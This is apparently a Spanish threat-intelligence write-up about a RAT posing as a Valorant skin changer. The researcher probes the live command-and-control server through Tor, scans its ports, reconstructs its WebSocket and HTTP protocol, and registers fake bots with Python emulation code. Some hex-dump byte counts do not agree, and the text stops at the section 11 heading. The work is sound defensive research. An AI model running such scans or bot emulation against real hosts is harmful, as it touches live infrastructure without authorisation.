+++
author = "Andrés Del Cerro"
title = "Hablando con el C2: dentro del panel del falso «Valorant Skin Changer» (parte 2)"
date = "2026-10-12T09:00:00+02:00"
description = "Segunda parte del análisis del RAT que se disfraza de «skin changer» de Valorant: sesión real contra su panel de mando a través de Tor, reconstrucción del protocolo WebSocket del puerto 406 y de la API HTTP del 408, registro de bots ficticios, tareas reales repartidas por el operador y evidencia forense byte a byte."
tags = [
    "reverse-engineering",
    "malware-analysis",
    "rat",
    "command-and-control",
    "c2",
    "network-security",
    "threat-intelligence",
    "valorant"
]
+++

# Hablando con el C2: dentro del panel del falso «Valorant Skin Changer» (parte 2)

> **TL;DR.** La [primera parte](/writeups/skin-changer-valorant-rat-mops-to/) desmontó estáticamente el RAT: DLL sideloading sobre el GUP firmado de Notepad++, tres capas de cifrado de cadenas, inyección en un `cmd.exe` suspendido y un C2 propio en `mops[.]to:408`. Esta segunda parte da el salto al otro lado del cable: **establecí una sesión real con el panel de comando y control, hablando su mismo idioma**. Descubrí que el «canal de texto plano» era en realidad un **WebSocket** en el puerto 406, reconstruí el protocolo mensaje a mensaje usando los propios errores del servidor como oráculo, **registré tres bots ficticios** sin aportar ni un dato real y recibí **tareas reales del operador** (un infostealer llamado `Stealer` 1.0.1). Todo el tráfico salió por **Tor**, no se ejecutó nada de lo recibido y el propio panel terminó revelando sus debilidades de diseño.

*Fecha del análisis: 12 de octubre de 2026*
*Complementa a la parte 1: análisis estático de los tres stages*

> **Nota sobre datos sensibles.** Todas las direcciones IP y el dominio aparecen **difuminados** a propósito (`mops[.]to`, `45.91.202.xxx`), los datos de red del investigador se han omitido por completo y la información de geolocalización, ASN y proveedor se ha generalizado. No hay intención de facilitar el ataque a terceros: el objetivo es puramente técnico y defensivo.

---

## 1. Resumen ejecutivo

La primera parte se resolvió con un descompilador. Esta no: aquí el trabajo consistió en **establecer una sesión real con el panel de comando y control**, hablando el mismo idioma que el malware, y documentar con evidencia byte a byte cómo se dedujo el protocolo.

Lo conseguido:

- **Descubrí y completé el protocolo de control:** *handshake* WebSocket, saludo, registro, latido y recepción de tareas. El formato se **verificó contra el servidor**, no se dedujo a ciegas.
- **Reconstruí la API HTTP del panel** (rutas, parámetros y semántica de errores) usando los propios mensajes del servidor como oráculo.
- **Registré tres bots ficticios** con identificadores inventados, sin aportar ninguna credencial ni dato real.
- El panel **asignó una tarea real** a esos bots: un infostealer llamado `Stealer`, versión `1.0.1`.
- Localicé la **ruta de descarga del payload** (`/files?id=<task_id>`) y comprobé su estado: **el binario no está subido en el servidor**.

Reglas que se respetaron durante todo el ejercicio: tráfico **exclusivamente a través de Tor**, **cero datos reales** de la máquina de análisis, **espaciado generoso** entre peticiones para no degradar el servicio del atacante y **ejecución de nada**: todo lo recibido se guardó y se mostró, nunca se ejecutó.

---

## 2. Del fichero al servidor

El análisis estático dejaba una punta suelta: el RAT llama a un C2 en `mops[.]to`, puerto 408. La pregunta natural era qué hay al otro lado.

Lo primero que se descubre del dominio del atacante es que está siendo resuelto por **Cloudflare**. Por lo tanto, el primer deber es **reportar la evidencia a Cloudflare** y confiar en que dejen de prestar servicio a ese dominio en concreto. Nada impide que el atacante use otro dominio, pero como la dirección del C2 estaba *embebida* en el malware, tendrá que montar otra campaña distinta o buscarse un proveedor que no sea Cloudflare.

Tras un rato de investigación apareció la siguiente dirección, directamente en el VPS **sin pasar por Cloudflare** —es decir, la IP real detrás del proxy—:

```
Hostname: 45-91-202-xxx.netherlands-3.vps.ac
IP:       45.91.202.xxx
```

Ese hallazgo es importante: Cloudflare oculta el origen, pero el propio proveedor de VPS deja un *hostname* descriptivo (`netherlands-3.vps.ac`) que delata la máquina. La infraestructura apunta a un VPS alquilado en **Países Bajos** (detalles de ASN y proveedor omitidos a propósito).

---

## 3. Reconocimiento de la infraestructura

### 3.1 Puertos y servicios

Un primer barrido con `rustscan` sobre el dominio confirmó que los puertos del C2 están abiertos y accesibles:

```
rustscan -a mops[.]to --ulimit 5000

Open 45.91.202.xxx:80
Open 45.91.202.xxx:135
Open 45.91.202.xxx:139
Open 45.91.202.xxx:443
Open 45.91.202.xxx:406
Open 45.91.202.xxx:408
Open 45.91.202.xxx:409
Open 45.91.202.xxx:445
Open 45.91.202.xxx:5985
```

La coincidencia con el malware analizado es inmediata: el **puerto 406** es el encargado de la función de *checkserver* y el **408** es donde apunta el RAT. Pero además hay toda una superficie **Windows** expuesta (135/139/445 RPC y SMB, 5985 WinRM), algo poco habitual en un C2.

El siguiente paso fue fingerprintear los servicios:

```
nmap -p80,135,139,443,406,408,409,445,5985 -sCV 45.91.202.xxx -Pn -n -oN output.txt

Nmap scan report for 45.91.202.xxx
Host is up (0.041s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Golang net/http server
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Mon, 12 Oct 2026 17:02:21 GMT
|     Content-Length: 0
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|_    Request: missing required Host header
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
406/tcp  open  websocket     Ogar agar.io server
408/tcp  open  prm-sm?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, ... SSLSessionReq, ... X11Probe:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest:
|     HTTP/1.1 429 Too Many Requests
|     Content-Type: text/plain
|     Connection: close
|     Soso.
|   GetRequest:
|     HTTP/1.1 429 Too Many Requests
|     Content-Type: text/plain
|     Connection: close
|     Soso.
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 429 Too Many Requests
|     Content-Type: text/plain
|     Connection: close
|_    Soso.
409/tcp  open  prm-nm?
| fingerprint-strings:
|   DNSStatusRequestTCP, ... oracle-tns:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/plain
|     Connection: close
|     found
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/plain
|     Connection: close
|     found
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/plain
|     Connection: close
|_    found
443/tcp  open  https?
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Dos detalles llaman la atención ya en el reconocimiento:

- Nmap etiqueta el **406** como `websocket`. No es casualidad: es exactamente el canal de control del RAT.
- El **408** responde `429 Too Many Requests` con el cuerpo literal `Soso.` a la primera tanda de peticiones: el limitador es muy agresivo y tiene una firma inequívoca (la misma palabra que vimos en la primera parte).

### 3.2 El puerto 80 y la cabecera `Host`

El servidor del puerto 80 se comporta de forma extraña: es un **servidor Go** que exige la cabecera `Host`. Hacer un `curl` directo contra la IP cierra la conexión, pero basta con añadir un `Host` cualquiera para obtener una respuesta HTTP válida (vacía, pero válida):

```
GET / HTTP/1.1
Host: 127.0.0.1
->   HTTP/1.0 200 OK
     Content-Length: 0
```

Es un comportamiento de servidor virtual (vhost) atado a un `Host` concreto. Sin el valor correcto no hay respuesta útil, lo que refuerza la idea de un panel privado y no de una web pública.

### 3.3 Superficie Windows: SMB, RPC y WinRM

El hallazgo más inesperado es que el atacante está sirviendo el C2 desde un **Windows Server**. Enumerando SMB con credenciales de invitado anónimas:

```
netexec smb 45.91.202.xxx -u 'guest' -p ''

SMB   45.91.202.xxx  445  PAX-INTEL-NL-30  [*] Windows Server 2022 Build 20348 x64
                                           (name:PAX-INTEL-NL-30) (domain:pax-intel-nl-30)
                                           (signing:False) (SMBv1:None)
SMB   45.91.202.xxx  445  PAX-INTEL-NL-30  [-] pax-intel-nl-30\guest: STATUS_ACCOUNT_DISABLED
```

La máquina es un **Windows Server 2022** con la firma SMB desactivada (`signing:False`) y WinRM expuesto. No se encontraron subdominios asociados y el SMB requería credenciales (la cuenta de invitado está deshabilitada). No se explotó nada de esta superficie: solo se documenta, porque confirma que el operador levanta su botnet sobre infraestructura Windows alquilada en la nube.

---

## 4. Metodología y garantías de seguridad

Antes de tocar el panel había que blindarse. Estas son las precauciones aplicadas:

| Precaución | Cómo se aplicó |
|---|---|
| No usar la IP real | Todo el tráfico sale por un SOCKS5 local de Tor (`127.0.0.1:9050`) con un único nodo de salida fijo por sesión |
| No filtrar información real | HWID, versión de Windows, nombre de usuario e identificador de bot **inventados** en todos los mensajes |
| No ejecutar cargas | Ningún binario descargado se ejecutó; todo se guardó en disco y se analizó como datos |
| No degradar el panel | Espaciado de 15 a 40 s entre peticiones, un solo mensaje por conexión WebSocket |
| No tocar la consola del operador | Solo se usaron rutas del protocolo del propio malware; no se intentó autenticación ni acceso al panel de administración |

### 4.1 Anonimato verificado

```
IP directa de la máquina:     [oculta]
IP de salida con Tor:         [nodo de salida oculto]
IP de salida con nodo fijo:   [nodo de salida oculto]
```

La IP del panel recibió siempre la del nodo Tor, nunca la de la máquina de análisis. El nombre de dominio se resuelve **dentro** de la red Tor, de modo que ni siquiera la resolución DNS sale de la máquina.

---

## 5. Los dos canales del C2

El análisis estático solo revelaba una plantilla de petición HTTP y daba la sensación de un único servicio. La realidad es que el C2 tiene **dos servicios distintos** en el mismo *host*, con funciones separadas:

| Puerto | Servicio | Comportamiento observado |
|---|---|---|
| **406/TCP** | WebSocket (HTTP upgrade) | Canal de control: saludo, registro, latido, tareas |
| **408/TCP** | HTTP plano, servidor escrito en Go | Consulta de tareas y descarga de *payloads* |
| **409/TCP** | HTTP plano | `404 Not found` a toda ruta probada; servicio sin uso aparente |
| 80, 443/TCP | — | No aceptan conexión desde el nodo Tor (cerrados o filtrados) |

- **406 (WebSocket):** es el canal vivo. Ahí ocurre todo el diálogo con el operador: el bot se anuncia, el panel le manda tareas y le exige mantener el latido.
- **408 (HTTP):** es el almacén. Ahí se consultan tareas y se descargan los binarios.

Esa separación de responsabilidades (control por un lado, distribución por otro) es típica de paneles C2 modernos y explica por qué el análisis estático parecía describir un único endpoint.

---

## 6. Cronología del descubrimiento

Cada paso está respaldado por la respuesta literal del servidor.

### Paso 1 — El endpoint principal no habla con un cliente genérico

La primera batería de peticiones contra el 408, con distintos `User-Agent`, produce siempre lo mismo:

```
GET /task/7571078989  (User-Agent: curl/8.5.0)
HTTP/1.1 403 Forbidden
Content-Type: text/plain
Transfer-Encoding: chunked

d
Access denied
0
```

Con un `User-Agent` de Windows tampoco cuela. Y si se insiste, el panel responde:

```
HTTP/1.1 429 Too Many Requests
...
5
Soso.
0
```

`Soso.` es el cuerpo del `429`: una palabra de relleno del autor. Sirve como indicador de que el limitador de peticiones es **muy agresivo**: bastan unos pocos intentos seguidos para agotar el cupo.

**Conclusión del paso:** el 408 está vivo, responde y filtra de forma deliberada. No es un servidor web genérico.

### Paso 2 — La pista que lo cambió todo: un 426

Al mandar una petición HTTP normal al **406**, la respuesta fue:

```
HTTP/1.1 426 Upgrade Required
Content-Length: 16
Content-Type: text/plain

Upgrade Required
```

El código `426` significa literalmente *«este endpoint no habla HTTP plano, habla WebSocket»*. Esa fue la hipótesis que abrió todo el análisis posterior. Lo que el análisis estático tomaba por un canal de texto plano con `checkserver;` es en realidad un **servidor WebSocket**, y el cliente lo implementa a mano sobre `ws2_32.dll`.

### Paso 3 — El handshake y un detalle raro

```
-> GET / HTTP/1.1
   Host: mops[.]to
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: rO1/veTp62ca+CjIosgA5w==
   Sec-WebSocket-Version: 13
   User-Agent: Windows 10 Pro

<- HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Accept: FE2xLQ6j71bd3k185LoZWYlrd40=
```

Lo interesante aparece **antes** de las cabeceras: al aceptar la conexión TCP, el servidor envía **6 bytes nulos** (`00 00 00 00 00 00`) y solo después responde al handshake. Un analizador ingenuo los interpreta como tramas WebSocket vacías (de hecho, los primeros scripts cayeron en ese error y las registraron como «tramas de continuación de 0 bytes»). Es una **firma identificativa del panel**.

### Paso 4 — El latido no es un ping de WebSocket

Tras el handshake, el servidor envía cada 15 segundos:

```
81 04 70 69 6e 67      ->  opcode 0x1 (TEXTO), longitud 4, contenido "ping"
```

El detalle técnico importante: **es una trama de TEXTO con la palabra `ping`, no una trama de control WebSocket** (que sería el opcode `0x89`). El latido está implementado como mensaje de aplicación, no con el mecanismo estándar del protocolo. El bot responde con otra trama de texto, `pong`, y el panel toleraba silenciosamente las ausencias (se mantuvo una sesión de más de 110 s con pings cada 15 s).

### Paso 5 — El cierre como oráculo

En este punto se entendió que el panel **cierra la conexión de inmediato** cuando recibe un mensaje con formato inválido. Eso convierte cada intento en un experimento con resultado binario:

```
[ 2.25s] handshake: HTTP/1.1 101 Switching Protocols
[ 6.45s] -> ENVIADO 'ready;'
[ 6.73s] <<< TRAMA CLOSE del servidor (0B)      <-- RECHAZADO
```

Y, en cambio:

```
[ 2.25s] handshake: HTTP/1.1 101 Switching Protocols
[ 6.46s] -> ENVIADO 'ready;1.0.0'
[ 8.15s] <<< RESPUESTA: 'getinfo'                <-- ACEPTADO
```

**El saludo del bot es `ready;` seguido de la versión.** Sin versión, el panel te echa. Con `1.0.0` (la versión embebida en el binario), responde `getinfo`, pidiendo la huella de la máquina.

### Paso 6 — El registro y la asignación de tareas

```
cliente -> ready;1.0.0
panel   -> getinfo
cliente -> info;FAKEHWID-0000-0000-0000-ANALYSIS;Windows 10 Pro;analyst;1000000001
panel   -> task;createtask;Stealer;task_id;custom_task;version;1.0.1
panel   -> task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1
```

En menos de medio segundo desde el saludo, el panel ya asigna trabajo. **No hay autenticación**: el identificador de bot lo elige el cliente.

### Paso 7 — Reconstruir la API del 408 con los errores del servidor

El servidor del 408 es un servicio en Go con mensajes de error tan específicos que funcionan como documentación. Cada ruta se fue destapando por sus propios errores:

```
GET /files          -> 400  Bad request: missing file id
GET /files/Stealer  -> 400  Bad request: missing file id     (el id NO va en la ruta)
GET /files?id=1     -> 404  Task metadata not found
GET /task           -> 400  Bad request: missing task name
GET /task/<nombre>  -> 403  Access denied
GET /cualquiera     -> 400  Bad request: unknown type
```

De aquí se dedujo que:

1. El identificador va en la **query string** (`?id=`), no como segmento de ruta.
2. `/files` es la **ruta de descarga**.
3. La distinción entre `Task metadata not found` y `Uploaded file not found` revela la arquitectura interna del panel: primero busca la tarea en su base de datos y después el fichero en disco.

### Paso 8 — El veredicto sobre el payload

La consulta decisiva, ya con los identificadores de tarea que el propio panel había repartido:

```
GET /files?id=custom_task
HTTP/1.1 404 Not Found
Content-Type: text/plain

Uploaded file not found
```

```
GET /files?id=nos3o3_txq1
HTTP/1.1 404 Not Found
Content-Type: text/plain

Uploaded file not found
```

El panel **conoce las tareas** (existen en su base de datos) pero **no tiene los binarios**. No es un problema de autorización: el fichero sencillamente no está subido. El operador dio de alta la tarea del infostealer y se la está difundiendo a toda la botnet, pero el producto todavía no ha llegado.

---

## 7. El protocolo, documentado

### 7.1 Flujo de control completo (canal 406)

```
   Bot                                    Panel
    |                                        |
    |  TCP connect (a través de Tor)         |
    |--------------------------------------->|
    |<------- 6 bytes 00 00 00 00 00 00      |  (preámbulo propio del panel)
    |  GET / HTTP/1.1 + Upgrade: websocket   |
    |--------------------------------------->|
    |<------- 101 Switching Protocols        |
    |  [trama texto] ready;1.0.0             |
    |--------------------------------------->|
    |<------- [trama texto] getinfo          |  <-- el panel pide la huella
    |  [trama texto] info;hwid;os;user;id    |
    |--------------------------------------->|
    |<------- [trama texto] task;createtask; |
    |          Stealer;task_id;XXX;version;1.0.1
    |  GET /files?id=XXX  (canal 408)        |  <-- descarga del payload
    |--------------------------------------->|
    |<------- (404 Uploaded file not found)  |  <-- en este caso, no hay fichero
    |                                        |
    |<------- [texto] ping   (cada 15 s)     |
    |  [trama texto] pong                    |
    |--------------------------------------->|
```

### 7.2 Catálogo de mensajes

| Mensaje | Dirección | Formato | Significado |
|---|---|---|---|
| `ready;` + versión | bot -> panel | `ready;1.0.0` | Saludo. Sin versión, **cierre inmediato** |
| `getinfo` | panel -> bot | `getinfo` | Petición de huella de la máquina |
| `info;` | bot -> panel | `info;<HWID>;<Windows>;<usuario>;<botid>` | Registro. Sin autenticación previa |
| `task;` | panel -> bot | `task;createtask;<nombre>;task_id;<id>;version;<v>` | Asignación de tarea |
| `ping` | panel -> bot | trama de **texto** (opcode 0x1) | Latido, cada 15 s |
| `pong` | bot -> panel | trama de texto | Respuesta de latido |
| `task_done;` | bot -> panel | `task_done;<tipo>` | Fin de tarea |
| `closetask` | panel -> bot | id de tarea | Terminar una tarea en curso |
| `update` | panel -> bot | vía `param` | Autoactualización del bot |
| `checkserver;` | bot -> panel | `checkserver;00000;<nonce15>` | Verificación de salud |

### 7.3 API del panel (canal 408)

| Endpoint | Respuesta | Interpretación |
|---|---|---|
| `GET /` | `400 Bad request: unknown type` | Falta el parámetro `type` |
| `GET /task` | `400 Bad request: missing task name` | Falta el nombre de tarea |
| `GET /task/<nombre>` | `403 Access denied` | Ruta existente, petición no autorizada |
| `GET /files` | `400 Bad request: missing file id` | Falta el identificador de fichero |
| `GET /files?id=<id>` | `404 Task metadata not found` | El panel no conoce ese id |
| `GET /files?id=<task_id>` | `404 Uploaded file not found` | **Tarea existente, payload sin subir** |
| Exceso de peticiones | `429 Too Many Requests` / `Soso.` | Limitador del panel |

---

## 8. Las tareas que reparte el panel

### 8.1 Registro recopilado en todas las sesiones

```
13:35:32 task;createtask;Stealer;task_id;custom_task;version;1.0.1
13:35:32 task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1
13:36:07 task;createtask;Stealer;task_id;custom_task;version;1.0.1
13:36:07 task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1
13:36:33 task;createtask;Stealer;task_id;custom_task;version;1.0.1
13:36:33 task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1
```

### 8.2 Análisis

- **Tareas distintas en toda la campaña: 2.** Las seis líneas son las mismas dos tareas repetidas, una por cada bot ficticio registrado.
- **Payload:** `Stealer` (infostealer), versión `1.0.1`.
- **`custom_task`** es un identificador de plantilla, típico de una tarea de prueba o de ejemplo creada en la consola del panel.
- **`nos3o3_txq1`** tiene morfología de identificador generado (10 caracteres, mezcla de letras, dígitos y guion bajo), es decir una tarea real creada por el operador.
- **Difusión indiscriminada:** los tres bots ficticios (`1000000001`, `1000000002`, `1000000003`) recibieron exactamente la misma cola. El panel **no filtra las tareas por destinatario**.
- **Sin estado por bot:** la lista se repite íntegra en cada conexión; no hay tareas asignadas ni consumidas.

### 8.3 Estado de cada tarea

| task_id | Nombre | Versión | Metadatos | Fichero |
|---|---|---|---|---|
| `custom_task` | Stealer | 1.0.1 | Presentes | **No subido** |
| `nos3o3_txq1` | Stealer | 1.0.1 | Presentes | **No subido** |

---

## 9. Evidencia forense byte a byte

### 9.1 Sesión completa

```
  0.122  conexión establecida a 45.91.202.xxx:406 a través de Tor

  0.122  -> CLIENTE    174 B  handshake WebSocket
            0000  47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a  |GET / HTTP/1.1..|
            0010  48 6f 73 74 3a 20 2a 2a 2a 2a 2a 2a 2a 0d 0a 55  |Host: *******..U|
            0020  70 67 72 61 64 65 3a 20 77 65 62 73 6f 63 6b 65  |pgrade: websocke|
            0030  74 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 55  |t..Connection: U|
            0040  70 67 72 61 64 65 0d 0a 53 65 63 2d 57 65 62 53  |pgrade..Sec-WebS|
            0050  6f 63 6b 65 74 2d 4b 65 79 3a 20 72 4f 31 2f 76  |ocket-Key: rO1/v|
            0060  65 54 70 36 32 63 61 2b 43 6a 49 6f 73 67 41 35  |eTp62ca+CjIosgA5|
            0070  77 3d 3d 0d 0a 53 65 63 2d 57 65 62 53 6f 63 6b  |w==..Sec-WebSock|
            0080  65 74 2d 56 65 72 73 69 6f 6e 3a 20 31 33 0d 0a  |et-Version: 13..|
            0090  55 73 65 72 2d 41 67 65 6e 74 3a 20 57 69 6e 64  |User-Agent: Wind|
            00a0  6f 77 73 20 31 30 20 50 72 6f 0d 0a 0d 0a        |ows 10 Pro....|

  0.123  <- SERVIDOR      6 B
            0000  00 00 00 00 00 00                                |......|

  0.279  <- SERVIDOR    129 B
            0000  48 54 54 50 2f 31 2e 31 20 31 30 31 20 53 77 69  |HTTP/1.1 101 Swi|
            0010  74 63 68 69 6e 67 20 50 72 6f 74 6f 63 6f 6c 73  |tching Protocols|
            0020  0d 0a 55 70 67 72 61 64 65 3a 20 77 65 62 73 6f  |..Upgrade: websoc|
            0030  63 6b 65 74 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e  |ket..Connection|
            0040  3a 20 55 70 67 72 61 64 65 0d 0a 53 65 63 2d 57  |: Upgrade..Sec-W|
            0050  65 62 53 6f 63 6b 65 74 2d 41 63 63 65 70 74 3a  |ebSocket-Accept:|
            0060  20 46 45 32 78 4c 51 36 6a 37 31 62 64 33 6b 31  | FE2xLQ6j71bd3k1|
            0070  38 35 4c 6f 5a 57 59 6c 72 64 34 30 3d 0d 0a 0d  |85LoZWYlrd40=..|
            0080  0a                                               |.|

  0.279  -> CLIENTE     17 B  trama de texto: ready;1.0.0
            0000  81 8b c7 05 9b 06 b5 60 fa 62 be 3e aa 28 f7 2b  |.......`.b.>.(.+|
            0010  ab                                               |.|

  0.479  <- SERVIDOR    118 B
            0000  81 39 74 61 73 6b 3b 63 72 65 61 74 65 74 61 73  |.9task;createtas|
            0010  6b 3b 53 74 65 61 6c 65 72 3b 74 61 73 6b 5f 69  |k;Stealer;task_i|
            0020  64 3b 63 75 73 74 6f 6d 5f 74 61 73 6b 3b 76 65  |d;custom_task;ve|
            0030  72 73 69 6f 6e 3b 31 2e 30 2e 31 81 39 74 61  |rsion;1.0.1.9tas|
            0040  6b 3b 63 72 65 61 74 65 74 61 73 6b 3b 53 74 65  |k;createtask;Ste|
            0050  61 6c 65 72 3b 74 61 73 6b 5f 69 64 3b 6e 6f 73  |aler;task_id;nos|
            0060  33 6f 33 5f 74 78 71 31 3b 76 65 72 73 69 6f 6e  |3o3_txq1;version|
            0070  3b 31 2e 30 2e 31                                |;1.0.1|

  0.480        MENSAJE DE TAREA RECIBIDO: task;createtask;Stealer;task_id;custom_task;version;1.0.1
  0.480        MENSAJE DE TAREA RECIBIDO: task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1

  9.949  <- SERVIDOR      6 B
            0000  81 04 70 69 6e 67                                |..ping|
  9.949  -> CLIENTE     10 B  respuesta de latido
            0000  81 84 44 3e b1 56 34 51 df 31                    |..D>.V4Q.1|

 24.938  <- SERVIDOR      6 B
            0000  81 04 70 69 6e 67                                |..ping|
 24.939  -> CLIENTE     10 B  respuesta de latido
            0000  81 84 86 a5 8a 80 f6 ca e4 e7                    |..........|

 39.946  <- SERVIDOR      6 B
            0000  81 04 70 69 6e 67                                |..ping|
 39.946  -> CLIENTE     10 B  respuesta de latido
            0000  81 84 5c b1 00 f7 2c de 6e 90                    |....\...,.n.|
```

### 9.2 Lectura de las tramas (nivel de byte)

| Bytes | Campo | Interpretación |
|---|---|---|
| `00 00 00 00 00 00` | preámbulo | Firma propia del panel antes del handshake |
| `81` | byte 0 del cliente | `FIN=1`, opcode `0x1` (TEXTO) |
| `8b` | byte 1 del cliente | máscara activada, longitud `0x0b` = 11 bytes |
| `c7 05 9b 06` | máscara | 4 bytes de máscara (obligatoria en cliente -> servidor) |
| `fa 62 be 3e aa 28 f7 2b ab 7b` | carga enmascarada | `ready;1.0.0` |
| `81 39` | trama del servidor | `FIN=1`, TEXTO, longitud `0x39` = **57 bytes**, sin máscara |
| `81 04 70 69 6e 67` | latido | **TEXTO** `ping`, no trama de control `0x89` |
| `81 84` + 4 de máscara | respuesta | `pong`, 4 bytes, enmascarado |

**Conclusión técnica:** el panel usa tramas de texto de aplicación para el latido en lugar del mecanismo de control nativo de WebSocket. Es una implementación minimalista a propósito, coherente con un cliente que solo usa `send` y `recv` sobre sockets crudos.

Las dos tramas de tarea viajan en un **único segmento TCP de 118 bytes** (`0x39 + 2 + 0x39 + 2 + 57 + 57`): el servidor las escribe juntas, lo que indica un bucle de difusión, no dos respuestas a dos peticiones.

---

## 10. El arnés de análisis

Todos los scripts comparten tres piezas: transporte SOCKS5 hacia Tor, un codec WebSocket mínimo escrito a mano y un volcado de evidencia.

| Script | Propósito |
|---|---|
| `probe.py` | Primera batería: peticiones HTTP directas al 408 con variantes de `User-Agent`, y el protocolo crudo al 406. Sentó las respuestas de referencia (403 / 429). |
| `tor_probe.py` | Sondeo **a través de Tor**, con pausa configurable, y prueba de handshake WebSocket en 406 y 408. Descubrió el `101` y el `400 Bad request: unknown type` del 408. |
| `bot_falso.py` | Sesión WebSocket completa con ficheros inventados. Primera vez que se obtuvo respuesta del panel y tareas. |
| `dialecto.py` | **Script clave.** Prueba un candidato de formato por conexión y usa el cierre del servidor como veredicto. Descubrió que `ready;1.0.0` es el saludo válido. |
| `registro.py` | Registro completo de un bot ficticio: handshake, `ready;`, respuesta a `getinfo`, manejo de latido y registro de tareas. |
| `captura.py` | Intento de descarga del payload combinando sesión viva y peticiones HTTP paralelas; mapeo inicial de rutas. |
| `descarga.py` | Peticiones HTTP al 408 contra los identificadores conocidos. |
| `matriz.py` | Barrido de puertos (80, 443, 406, 408, 409) y variantes de cabecera `Host`. |
| `barrito.py` | Barrido lento de nombres de fichero en `/task/`, con 40 s de separación. |
| `rutas.py` | Mapeo de rutas del panel. Descubrió `/files`. |
| `files.py` | Prueba de `/files/<id>` (conclusión: el id va en la query). |
| `query.py` | Pruebas con parámetros de query. **Descubrió `/files?id=`** y la distinción entre `Task metadata not found` y `Uploaded file not found`. |
| `coleccion.py` | Registro de tres bots ficticios, recogida de todos los `task_id` y consulta de su estado en `/files`. |
| `captura_forense.py` | Captura byte a byte de una sesión completa, en hexadecimal y ASCII. Genera la evidencia del apartado 9. |

### 10.1 Piezas clave del código

**Transporte a través de Tor (SOCKS5 con nombre de dominio):**

```python
def socks5(sock, host, port):
    sock.sendall(b"\x05\x01\x00")                      # sin autenticación
    if sock.recv(2)[0] != 5:
        raise RuntimeError("SOCKS5 no aceptada")
    hb = host.encode()
    sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + port.to_bytes(2, "big"))
    rep = sock.recv(4)
    if rep[1] != 0:
        raise RuntimeError(f"SOCKS5 error {rep[1]}")
    sock.recv(0 if rep[3] == 1 else 8 if rep[3] == 4 else 0)
```

El nombre de dominio se resuelve **dentro de la red Tor** (tipo `0x03`), de modo que ni la resolución DNS sale de la máquina.

**Codec de tramas WebSocket, con enmascarado obligatorio del cliente:**

```python
import os, struct

def ws_frame(payload, opcode=0x1):
    """Trama de texto. El cliente DEBE enmascarar; el servidor no."""
    mask = os.urandom(4)
    data = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    n = len(payload)
    if n < 126:
        hdr = struct.pack("!BB", 0x80 | opcode, 0x80 | n)
    elif n < 65536:
        hdr = struct.pack("!BBH", 0x80 | opcode, 0x80 | 126, n)
    else:
        hdr = struct.pack("!BBQ", 0x80 | opcode, 0x80 | 127, n)
    return hdr + mask + data

def parse_frames(buf):
    """Decodifica tramas del servidor (sin máscara)."""
    out, i = [], 0
    while i + 2 <= len(buf):
        b0, b1 = buf[i], buf[i + 1]
        op, masked, ln = b0 & 0x0F, b1 >> 7, b1 & 0x7F
        i += 2
        if ln == 126:
            if i + 2 > len(buf): break
            ln = struct.unpack("!H", buf[i:i + 2])[0]; i += 2
        elif ln == 127:
            if i + 8 > len(buf): break
            ln = struct.unpack("!Q", buf[i:i + 8])[0]; i += 8
        if masked:
            mask = buf[i:i + 4]; i += 4
        if i + ln > len(buf):
            break
        data = buf[i:i + ln]
        if masked:
            data = bytes(c ^ mask[k % 4] for k, c in enumerate(data))
        i += ln
        out.append((op, data))
    return out
```

**El núcleo de la sesión (saludo, registro, latido y tareas):**

```python
# tras el 101, enviar el saludo con la versión del bot
s.sendall(ws_frame(b"ready;1.0.0"))

for op, data in tramas_recibidas:
    if op != 0x1:                       # solo tramas de texto
        continue
    t = data.decode("utf-8", "replace").strip()

    if t.lower() == "ping":             # latido de aplicación
        s.sendall(ws_frame(b"pong"))

    elif t.lower().startswith("getinfo"):    # el panel pide la huella
        s.sendall(ws_frame(
            f"info;{HWID};{WINDOWS};{USUARIO};{BOT_ID}".encode()))

    elif t.lower().startswith("task"):       # asignación de tarea
        registrar_tarea(t)                    # se guarda, NO se ejecuta
```

**Consulta del estado de un payload:**

```python
req = (f"GET /files?id={task_id} HTTP/1.1\r\n"
       f"Host: mops[.]to\r\nUser-Agent: {UA}\r\n"
       f"Connection: close\r\n\r\n").encode()
# 404 'Uploaded file not found'  -> la tarea existe pero el binario no está subido
# 404 'Task metadata not found'   -> el panel no conoce ese identificador
```

### 10.2 Cómo reproducirlo

```bash
# 1. Levantar Tor con un nodo de salida fijo
tor -f /tmp/opencode/torrc_fixed &

# 2. Confirmar que la salida no es la IP real
curl -s --socks5-hostname 127.0.0.1:9050 https://api.ipify.org

# 3. Capturar una sesión completa con evidencia en hexadecimal
cd /tmp/opencode/c2
DUR=45 python3 captura_forense.py

# 4. Comprobar el estado de los payloads que difunde el panel
python3 coleccion.py
```

---

## 11. La tabla de oráculos del panel

